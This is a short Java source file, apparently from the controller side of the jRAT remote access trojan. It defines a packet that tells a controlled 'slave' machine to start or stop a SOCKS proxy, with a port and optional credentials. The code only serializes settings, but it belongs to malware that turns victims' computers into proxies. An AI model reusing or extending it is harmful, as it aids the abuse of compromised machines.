package jrat.module.socks;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;

public class PacketControl implements OutgoingPacket {

    private boolean enabled;
	private boolean socks5;
	private boolean auth;
	private String user;
	private String pass;
	private int port;

	public PacketControl(boolean enabled) {
	    this.enabled = enabled;
    }
	
	public PacketControl(boolean socks5, boolean auth, String user, String pass, int port) {
	    this(true);
		this.socks5 = socks5;
		this.auth = auth;
		this.user = user;
		this.pass = pass;
		this.port = port;
	}

	@Override
	public void write(Slave slave) throws Exception {
        slave.writeBoolean(enabled);

        if (enabled) {
            slave.writeBoolean(socks5);
            slave.writeInt(port);
            slave.writeBoolean(auth);
            slave.writeLine(user);
            slave.writeLine(pass);
        }
    }

	@Override
    public short getPacketId() {
	    return 200;
    }
}
